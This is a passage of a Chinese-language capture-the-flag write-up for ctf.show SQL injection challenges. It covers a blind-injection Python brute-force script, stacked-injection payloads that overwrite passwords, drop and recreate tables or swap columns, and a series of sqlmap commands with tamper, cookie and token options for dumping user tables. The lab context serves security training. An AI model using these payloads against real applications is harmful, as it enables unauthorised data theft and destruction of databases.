class="hljs-string">'*'</span>);<br></code></pre></td></tr></tbody></table></figure><p>上述示例将返回字符串 <code>'*****Hello'</code>，因为它在字符串 <code>'Hello'</code> 的左侧添加了 5 个 <code>*</code> 字符，使其总长度达到目标长度 10。</p><p>PY:</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">payload = "'or ((lpad((<span class="hljs-keyword">select</span> f1ag <span class="hljs-keyword">from</span> ctfshow_flxg),{},<span class="hljs-string">''</span>)=<span class="hljs-string">'{}'</span>))#<span class="hljs-string">".format(i,flag + key)</span><br></code></pre></td></tr></tbody></table></figure><p>脚本：</p><figure class="highlight sas"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sas">import requests<br>import time<br><br>url = <span class="hljs-string">"http://23f26665-5c68-47cb-869f-7f954ea5e77f.challenge.ctf.show/api"</span><br><br>flagstr = <span class="hljs-string">"}{abcdefghijklmnopqr-stuvwxyz0123456789"</span><br>flag = <span class="hljs-string">""</span><br>for i <span class="hljs-keyword">in</span> <span class="hljs-meta">range</span>(1, 60):<br>    for <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> flagstr:<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select database()),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # ctfshow_web<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # ctfshow_fl0g<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # id,f1ag<br>        payload = <span class="hljs-string">"'or ((lpad((select f1ag from ctfshow_flxg),{},'')='{}'))#"</span>.<span class="hljs-keyword">format</span>(i, flag + <span class="hljs-keyword">key</span>)<br><span class="hljs-keyword"></span><br><span class="hljs-keyword">        data </span>= {<br>            <span class="hljs-string">"username"</span>: payload,<br>            <span class="hljs-string">"password"</span>: 0<br>        }<br>        res = requests.post(url, data=data)<br>        time.sleep(0.3)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">"8bef"</span>) &gt; 0:<br>            flag += <span class="hljs-keyword">key</span><br>            pr<span class="hljs-meta">int</span>(flag)<br>            break<br><br><br></code></pre></td></tr></tbody></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="WEB195"><a href="#WEB195" class="headerlink" title="WEB195"></a>WEB195</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//拼接sql语句查找指定ID用户</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select pass from ctfshow_user where username = <span class="hljs-subst">{$username}</span>;"</span>;<br><br><span class="hljs-comment">//密码检测</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)){<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'密码只能为数字'</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-comment">//密码判断</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==<span class="hljs-variable">$password</span>){<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'登陆成功'</span>;<br>  }<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span>, <span class="hljs-variable">$username</span>)){<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'用户名非法'</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]==<span class="hljs-variable">$password</span>){<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">"登陆成功 flag is <span class="hljs-subst">$flag</span>"</span>;<br>}<br>  <br></code></pre></td></tr></tbody></table></figure><p>通过查询语句可知表ctfshow_user和字段名pass,虽然过滤了空格，但是可以使用反引号。</p><figure class="highlight abnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">username</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;update`ctfshow_user`set`pass`=1&amp;password=1</span><br>//这里username<span class="hljs-operator">=</span><span class="hljs-number">1</span>；写成username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;也可以的，不影响后面update的执行，两条语句都会执行。</span><br></code></pre></td></tr></tbody></table></figure><p>登录：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">然后<span class="hljs-attribute">username</span>=0&amp;password=1登陆。<br>（<span class="hljs-attribute">username</span>=0这个做法在web188中有提到，就是匹配所有开头不是数字或者为0的字符串和数字0）<br></code></pre></td></tr></tbody></table></figure><h3 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h3><figure class="highlight gherkin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧<br>  if(preg_match('/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\'</span>|<span class="hljs-string">\"</span>|<span class="hljs-string">se1ect</span>|<span class="hljs-string">union</span>|<span class="hljs-string">or</span>|<span class="hljs-string">and</span>|<span class="hljs-string">\x26</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into/i', $username)){</span><br><span class="hljs-string">    $ret['msg']='用户名非法';</span><br><span class="hljs-string">    die(json_encode($ret));</span><br><span class="hljs-string">  }</span><br><span class="hljs-string"></span><br><span class="hljs-string">  if(strlen($username)&gt;16){</span><br><span class="hljs-string">    $ret['msg']='用户名不能超过16个字符';</span><br><span class="hljs-string">    die(json_encode($ret));</span><br><span class="hljs-string">  }</span><br><span class="hljs-string"></span><br><span class="hljs-string">  if($row[0]==$password){</span><br><span class="hljs-string">      $ret['msg']="登陆成功 flag is $flag";</span><br><span class="hljs-string">  }</span><br></code></pre></td></tr></tbody></table></figure><p>和上一题相比，限定了用户名的长度，上面本拟过滤se1ect,其中是1，不是l</p><figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select 0x11111;select 2;</span><br><span class="hljs-section">+---------+</span><br><span class="hljs-section">| 0x11111 |</span><br><span class="hljs-section">+---------+</span><br><span class="hljs-section">|      |</span><br><span class="hljs-section">+---------+</span><br>1 row in set (0.00 sec)<br><br><span class="hljs-code">+---+</span><br><span class="hljs-section">| 2 |</span><br><span class="hljs-section">+---+</span><br><span class="hljs-section">| 2 |</span><br><span class="hljs-section">+---+</span><br>1 row in set (0.00 sec)<br><br>mysql&gt;<br></code></pre></td></tr></tbody></table></figure><p>可以看到，两个select语句查询结果不论第一个结果是如何的，根据PHP验证密码的代码逻辑，都会保存到数组<code>$row</code>中，这里代码虽然只判断了<code>$row</code>[0}，但应该循环遍历了，才会使<code>$row[?] = 2</code>成立。</p><p>PY:</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-number">1</span><span class="hljs-comment">;select(2)&amp;password=2</span><br><span class="hljs-attr">username</span>=<span class="hljs-number">0</span>&amp;password=passwordAUTO<br></code></pre></td></tr></tbody></table></figure><p>后面的payload是根据前面题目泄露的密码来实现登录的。</p><h3 id="WEB197"><a href="#WEB197" class="headerlink" title="WEB197"></a>WEB197</h3><figure class="highlight gherkin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧<br>if('/\<span class="hljs-symbol">*</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\'</span>|<span class="hljs-string">\"</span>|<span class="hljs-string">union</span>|<span class="hljs-string">or</span>|<span class="hljs-string">and</span>|<span class="hljs-string">\x26</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select</span>|<span class="hljs-string">update</span>|<span class="hljs-string">set//i', $username)){</span><br><span class="hljs-string">  $ret['msg']='用户名非法';</span><br><span class="hljs-string">  die(json_encode($ret));</span><br><span class="hljs-string">}</span><br><span class="hljs-string"></span><br><span class="hljs-string">if($row[0]==$password){</span><br><span class="hljs-string">    $ret['msg']="登陆成功 flag is $flag";</span><br><span class="hljs-string">}</span><br></code></pre></td></tr></tbody></table></figure><p>可以看到，这次没有过滤<strong>空格</strong>。</p><p>PY1:</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-number">0</span>&amp;password=passwordAUTO<br></code></pre></td></tr></tbody></table></figure><p>PY2:</p><p>删除以前的表，再自己新建一个并且插入数据：u1,p2,然后直接使用u1，p2登录即可得到flag</p><figure class="highlight less"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-number">0</span>;<span class="hljs-selector-tag">drop</span> <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">ctfshow_user</span>;<span class="hljs-selector-tag">create</span> <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">ctfshow_user</span>(<span class="hljs-built_in">`username`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>),<span class="hljs-built_in">`pass`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>));<span class="hljs-selector-tag">insert</span> <span class="hljs-selector-tag">ctfshow_user</span>(<span class="hljs-built_in">`username`</span>,<span class="hljs-built_in">`pass`</span>) <span class="hljs-selector-tag">value</span>(u1,p2)<br></code></pre></td></tr></tbody></table></figure><p>PY3:</p><p>这个思路我真的觉得想出来的人真是厉害。</p><p>利用show。根据题目给的查询语句,通过查询语句可以知道数据库的表名为ctfshow_user，那么可以通过show tables，获取表名的结果集，在这个结果集里定然有一行的数据为ctfshow_user。</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=1;show tables&amp;<span class="hljs-attribute">password</span>=ctfshow_user<br><span class="hljs-attribute">username</span>=1;desc ctfshow_user&amp;<span class="hljs-attribute">password</span>=pass<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB198"><a href="#WEB198" class="headerlink" title="WEB198"></a>WEB198</h3><p>增加了过滤SQL关键词drop和create</p><figure class="highlight gherkin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧<br>if('/\<span class="hljs-symbol">*</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\'</span>|<span class="hljs-string">\"</span>|<span class="hljs-string">union</span>|<span class="hljs-string">or</span>|<span class="hljs-string">and</span>|<span class="hljs-string">\x26</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select</span>|<span class="hljs-string">update</span>|<span class="hljs-string">set</span>|<span class="hljs-string">create</span>|<span class="hljs-string">drop/i', $username)){</span><br><span class="hljs-string">  $ret['msg']='用户名非法';</span><br><span class="hljs-string">  die(json_encode($ret));</span><br><span class="hljs-string">}</span><br></code></pre></td></tr></tbody></table></figure><p>在已知有一个默认用户名为userAUTO的情况下，这里可以考虑列名互换。<br>将username和pass互换，这样就可以用userAUTO进行密码登录了。</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB199"><a href="#WEB199" class="headerlink" title="WEB199"></a>WEB199</h3><p>过滤了括号，可以使用text</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">本题过滤了括号，限制了之前payload中的<span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>)，可以改为<span class="hljs-type">text</span>。<br><br><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` <span class="hljs-type">text</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` <span class="hljs-type">text</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` <span class="hljs-type">text</span>;<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB200"><a href="#WEB200" class="headerlink" title="WEB200"></a>WEB200</h3><p>增加了对逗号的过滤，web199方法可用。</p><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="WEB201"><a href="#WEB201" class="headerlink" title="WEB201"></a>WEB201</h3><p>题目说明了需要指定两个参数：</p><figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">使用<span class="hljs-comment">--user-agent 指定agent</span><br>使用<span class="hljs-comment">--referer 绕过referer检查</span><br></code></pre></td></tr></tbody></table></figure><ol><li><code>--user-agent</code> 参数用于设置 HTTP 请求的用户代理（User-Agent）头部字段。用户代理是一个字符串，用于标识发送请求的客户端应用程序或浏览器。通过指定自定义的用户代理，可以模拟不同的客户端环境或绕过某些限制。</li><li><code>--referer</code> 参数用于设置 HTTP 请求的引荐来源（Referer）头部字段。引荐来源指示请求是从哪个页面或网址链接过来的。通过设置引荐来源，可以模拟从特定页面发起的请求。</li></ol><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap.py -u <span class="hljs-string">"http://ad34430e-5963-46f0-b4bc-aabce11aead4.challenge.ctf.show/api/?id="</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show<br></code></pre></td></tr></tbody></table></figure><p>查库：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show --dbs<br></code></pre></td></tr></tbody></table></figure><p>查表：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></tbody></table></figure><p>查字段：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --columns<br></code></pre></td></tr></tbody></table></figure><p>查数据：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --dump<br><span class="hljs-comment">#--dump 是一个参数选项，用于执行数据库的数据提取操作。它用于从目标应用程序的数据库中获取数据，并将其以结构化的形式输出。</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB202"><a href="#WEB202" class="headerlink" title="WEB202"></a>WEB202</h3><p><code>--data</code> 是一个参数选项，用于指定要发送的 POST 数据。它用于针对目标应用程序的带有参数的 POST 请求进行 SQL 注入测试。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">"http://cca6a196-4f81-44ec-9d20-556a2aae0834.challenge.ctf.show/api/"</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attr">--user-agent</span>=sqlmap <span class="hljs-attr">--referer</span>=ctf<span class="hljs-selector-class">.show</span> -D ctfshow_web -T ctfshow_user <span class="hljs-attr">--dump</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB203"><a href="#WEB203" class="headerlink" title="WEB203"></a>WEB203</h3><p>使用–method 调整sqlmap的请求方式</p><p>–method=方法  强制使用指定的方式进行连接，例如PUT  </p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python sqlmap.py -u <span class="hljs-string">"http://b8366c04-871e-45b6-b332-cb6962888879.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT <span class="hljs-attribute">--header</span>=Content-Type:text/plain <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --dump<br></code></pre></td></tr></tbody></table></figure><p>在 SQLmap 工具中，<code>--headers</code> 参数用于指定要发送的 HTTP 请求头部信息。具体而言，<code>--headers</code> 参数可以用来设置请求的 Content-Type（内容类型）头部字段。</p><p><code>--headers</code> 参数后的字符串 <code>"Content-Type: text/plain"</code> 设置了请求的 Content-Type 头部字段为 <code>text/plain</code>，表明请求的内容是纯文本类型。</p><h3 id="WEB204"><a href="#WEB204" class="headerlink" title="WEB204"></a>WEB204</h3><p>使用–cookie 提交cookie数据</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">"http://e497aba7-725c-487b-b3b9-54f0f677c7d7.challenge.ctf.show/api/index.php"</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">"ctfshow=6daba8a2b1f168ba92da07587b2cd1ff;PHPSESSID=k70fe1sbeheh768f9lhrnmd447"</span> <span class="hljs-attr">--user-agent</span>=sqlmap <span class="hljs-attr">--referer</span>=ctf<span class="hljs-selector-class">.show</span> -D ctfshow_web -T ctfshow_user <span class="hljs-attr">--dump</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB205"><a href="#WEB205" class="headerlink" title="WEB205"></a>WEB205</h3><p>在每次请求url/api/index.php之前需要先请求URL/api/getTokn.php</p><figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--safe-url 设置在测试目标地址前访问的安全链接</span><br> <span class="hljs-comment">--safe-freq 设置两次注入测试前访问安全链接的次数</span><br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python sqlmap.py -u <span class="hljs-string">"http://bc631087-8535-4c5b-830f-83dcedb8434f.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://bc631087-8535-4c5b-830f-83dcedb8434f.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=e5cp9lcnqfo3e6ru4dt41642l3"</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT <span class="hljs-attribute">--header</span>=Content-Type:text/plain <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></tbody></table></figure><p>SQLMAP跑不出来</p><h3 id="WEB206"><a href="#WEB206" class="headerlink" title="WEB206"></a>WEB206</h3><p>提示SQL需要闭合：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select id,username,pass from ctfshow_user where id = ('"</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">"') limit 0,1;"</span>;<br></code></pre></td></tr></tbody></table></figure><p>–prefix=PREFIX 攻击载荷的前缀</p><p>–suffix=SUFFIX 攻击载荷的后缀</p><p>PY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://e15e183b-345b-474b-b491-164951f03aa5.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://e15e183b-345b-474b-b491-164951f03aa5.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=7pqhussjpqb1fftslnljopu8hl"</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">"')"</span> <span class="hljs-attribute">--suffix</span>=<span class="hljs-string">"#"</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT <span class="hljs-attribute">--header</span>=Content-Type:text/plain <span class="hljs-attribute">--referer</span>=ctf.show<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB207"><a href="#WEB207" class="headerlink" title="WEB207"></a>WEB207</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ /'</span>, <span class="hljs-variable">$str</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure><p>过滤了空格</p><p>PY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://9507b4d3-5ca0-46bc-af7a-a77913b1761b.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://9507b4d3-5ca0-46bc-af7a-a77913b1761b.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=mk5nb09g143c60d5uh4sb9fc1f"</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">"')"</span> <span class="hljs-attribute">--suffix</span>=<span class="hljs-string">"#"</span> <span class="hljs-attribute">--tamper</span>=space2comment <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT <span class="hljs-attribute">--header</span>=Content-Type:text/plain <span class="hljs-attribute">--referer</span>=ctf.show<br></code></pre></td></tr></tbody></table></figure><p><code>--tamper=space2comment</code> 将 SQL 语句中的空格字符（包括空格、制表符、换行符等）替换为 SQL 注释字符（<code>/**/</code>），以实现将空格字符转换为注释的效果。</p><h3 id="WEB208"><a href="#WEB208" class="headerlink" title="WEB208"></a>WEB208</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'select'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$id</span>);<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ /'</span>, <span class="hljs-variable">$str</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure><p>将select替空，可以使用双写绕过，也可以使用大小写绕过</p><p>PY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://ffa2159b-c185-4525-b3c5-9f39fb76afee.challenge.ctf.show/api/index.php"</span> --dump <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://ffa2159b-c185-4525-b3c5-9f39fb76afee.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=hdffns5n4d5lkbkri059dnkua0"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=space2comment<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB209"><a href="#WEB209" class="headerlink" 